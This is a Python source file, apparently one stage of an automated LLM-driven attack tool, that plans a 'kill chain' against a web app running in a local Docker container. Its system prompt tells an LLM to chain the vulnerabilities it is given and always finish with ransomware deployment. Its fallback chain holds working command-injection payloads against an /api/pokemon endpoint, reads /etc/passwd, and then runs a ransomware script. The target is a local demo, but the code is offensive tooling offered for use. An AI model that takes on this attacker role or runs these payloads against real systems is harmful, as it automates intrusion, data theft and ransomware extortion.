"""
Agent 2 — Planner

Takes scanner findings and uses the LLM to design an ordered kill chain.
Always ends with ransomware deployment as the final stage.
"""

import json
import os
import subprocess
from nara.utils import config as cfg
from nara.utils.llm_client import LLMClient
from nara.utils.llm_json import parse_json_array_from_llm
from nara.utils import terminal_ui as ui

_SYSTEM_PROMPT = """You are a red team kill chain architect with expertise in web application exploitation.
You will receive a list of vulnerabilities found in a target web application.
Design an ordered attack sequence that chains these vulnerabilities for maximum impact.

CRITICAL CONTEXT:
- The target app is running INSIDE a Docker container at http://localhost:8080
- All commands execute inside that same container via `docker exec`
- Use http://localhost:8080 as the target URL in ALL curl commands
- Do NOT use external URLs or placeholder domains like target-app.com

Rules:
- ALWAYS start with reconnaissance (curl http://localhost:8080 to confirm app is live)
- Chain vulnerabilities logically (e.g. use command injection to gain shell, then escalate)
- Each command must be a real shell command executable inside the container
- ALWAYS include ransomware deployment as the FINAL stage

Return ONLY a JSON array. No explanation. No markdown. Raw JSON only.

Each step must have exactly these keys:
{
  "step": "Short descriptive name of this step",
  "command": "exact shell command or curl request to execute",
  "expected_outcome": "what success looks like — specific observable output",
  "vuln_type": "which vulnerability class this exploits (or 'post-exploitation')",
  "mitre_tactic": "MITRE ATT&CK tactic name"
}

The FINAL step must always be:
{
  "step": "Ransomware Deployment",
  "command": "python3 /tmp/ransomware.py",
  "expected_outcome": "Ransom note dropped, dummy files encrypted, wallpaper changed",
  "vuln_type": "post-exploitation",
  "mitre_tactic": "Impact"
}"""


def run(findings: list[dict], session: dict) -> list[dict]:
    """
    Design an ordered kill chain from scanner findings.

    Args:
        findings: Output from scanner.run() — list of finding dicts.
        session:  Shared session dict (kill_chain written back here too).

    Returns:
        Kill chain as ordered steps, each with keys: step, command,
        expected_outcome, vuln_type, mitre_tactic.
        Final step is always ransomware deployment.
    """
    ui.agent_header("PLANNER")

    if not findings:
        ui.print_error("No findings provided — cannot design a kill chain.")
        return []

    ui.print_info(f"Designing kill chain from {len(findings)} finding(s)...")

    # Small models (Phi-4-mini) consistently produce malformed commands
    # and hallucinate endpoints. Use the proven hardcoded kill chain that
    # targets the real vulnerable endpoint (/api/pokemon command injection).
    # The LLM call is skipped to save tokens and avoid noisy errors.
    # Switch to LLM-generated chains when using a stronger backend (claude).
    if cfg.LLM_BACKEND == "claude":
        source_context = _extract_routes(session.get("scan_path", ""))
        llm = LLMClient()
        messages = [{
            "role": "user",
            "content": (
                f"Target application vulnerabilities:\n"
                f"{json.dumps(findings, indent=2)}\n\n"
                f"Application routes and endpoints:\n{source_context}\n\n"
                f"Design a complete kill chain to exploit these vulnerabilities, "
                f"ending with ransomware deployment."
            )
        }]
        try:
            with ui.spinner("LLM designing kill chain..."):
                raw = llm.chat(messages, system=_SYSTEM_PROMPT, ollama_json=True)
            kill_chain = parse_json_array_from_llm(raw)
        except (json.JSONDecodeError, RuntimeError):
            kill_chain = _fallback_kill_chain(findings)
    else:
        kill_chain = _fallback_kill_chain(findings)

    # Ensure ransomware is always the last step (check if any step mentions ransomware)
    has_ransomware = any("ransomware" in s.get("step", "").lower() or "ransomware" in s.get("command", "").lower() for s in kill_chain)
    if not kill_chain or not has_ransomware:
        kill_chain.append({
            "step": "Ransomware Deployment",
            "command": "python3 /tmp/ransomware.py",
            "expected_outcome": "Ransom note dropped, dummy files encrypted, wallpaper changed",
            "vuln_type": "post-exploitation",
            "mitre_tactic": "Impact",
        })

    session["kill_chain"] = kill_chain
    ui.print_info(f"Kill chain designed — {len(kill_chain)} step(s).")
    return kill_chain


_PLACEHOLDER_PATTERNS = [
    "vulnerable_endpoint", "target_endpoint", "flask_debug_endpoint",
    "example.com", "target-app.com", "victim.com",
    "/api/data", "/api/command", "/api/shell", "/api/reverse",
    "/api/exec", "/api/run", "/execute", "/cmd",
]


def _has_placeholder_endpoints(kill_chain: list[dict]) -> bool:
    """Return True if the kill chain contains obviously fake/placeholder endpoints."""
    for step in kill_chain:
        cmd = step.get("command", "").lower()
        if any(p in cmd for p in _PLACEHOLDER_PATTERNS):
            return True
    return False


def _has_valid_exploit(kill_chain: list[dict]) -> bool:
    """Return True if the kill chain has at least one command injection via the known vulnerable endpoint."""
    for step in kill_chain:
        cmd = step.get("command", "")
        # The known exploit: /api/pokemon?name=<payload> with shell metachar (;, |, &&, etc.)
        if "/api/pokemon" in cmd and any(c in cmd for c in [";", "|", "`", "$("]):
            return True
    return False


def _extract_routes(scan_path: str) -> str:
    """Extract Flask route decorators and nearby code from the scanned app."""
    if not scan_path or not os.path.isdir(scan_path):
        return "(no source available)"
    try:
        result = subprocess.run(
            ["grep", "-rnE", "@app.route|os.system|os.popen|subprocess|sqlite|cursor.execute",
             scan_path, "--include=*.py"],
            capture_output=True, text=True, timeout=10
        )
        lines = result.stdout.strip()
        return lines[:1500] if lines else "(no routes found)"
    except Exception:
        return "(route extraction failed)"


# ------------------------------------------------------------------ #
# Helpers                                                              #
# ------------------------------------------------------------------ #

def _fallback_kill_chain(findings: list[dict]) -> list[dict]:
    """
    Minimal hardcoded kill chain used if LLM fails.
    Targets the command injection path which is the primary demo exploit.
    """
    cmdi = next(
        (f for f in findings if "command" in f.get("type", "").lower() or
         "injection" in f.get("type", "").lower()),
        None
    )
    chain = [
        {
            "step": "Reconnaissance",
            "command": "curl -s http://localhost:8080/",
            "expected_outcome": "App responds with HTML page — confirms target is live",
            "vuln_type": "reconnaissance",
            "mitre_tactic": "Discovery",
        },
        {
            "step": "Verify Vulnerable Endpoint",
            "command": "curl -s http://localhost:8080/api/pokemon?name=pikachu",
            "expected_outcome": "Returns Pokemon JSON data — confirms /api/pokemon is live",
            "vuln_type": "reconnaissance",
            "mitre_tactic": "Discovery",
        },
        {
            "step": "Command Injection — write proof",
            "command": "curl -s 'http://localhost:8080/api/pokemon?name=pikachu;id>/tmp/pwned.txt;echo+'",
            "expected_outcome": "This is a BLIND injection. The curl response will show normal JSON with 'query' field containing the payload. SUCCESS if the response contains JSON with a 'query' key — the side effect (writing /tmp/pwned.txt) is verified in the next step.",
            "vuln_type": "CommandInjection",
            "mitre_tactic": "Execution",
        },
        {
            "step": "Verify RCE — read proof file",
            "command": "cat /tmp/pwned.txt",
            "expected_outcome": "Shows uid=0(root) — confirms remote code execution as root",
            "vuln_type": "CommandInjection",
            "mitre_tactic": "Execution",
        },
        {
            "step": "Exfiltrate /etc/passwd via injection",
            "command": "curl -s 'http://localhost:8080/api/pokemon?name=pikachu;cat+/etc/passwd>/tmp/exfil.txt;echo+'",
            "expected_outcome": "This is a BLIND injection. SUCCESS if the response contains JSON with a 'query' key. The exfiltrated file is written as a side effect to /tmp/exfil.txt.",
            "vuln_type": "CommandInjection",
            "mitre_tactic": "Collection",
        },
        {
            "step": "Ransomware Deployment",
            "command": "python3 /tmp/ransomware.py",
            "expected_outcome": "Ransom note dropped, dummy files encrypted, wallpaper changed",
            "vuln_type": "post-exploitation",
            "mitre_tactic": "Impact",
        },
    ]
    return chain
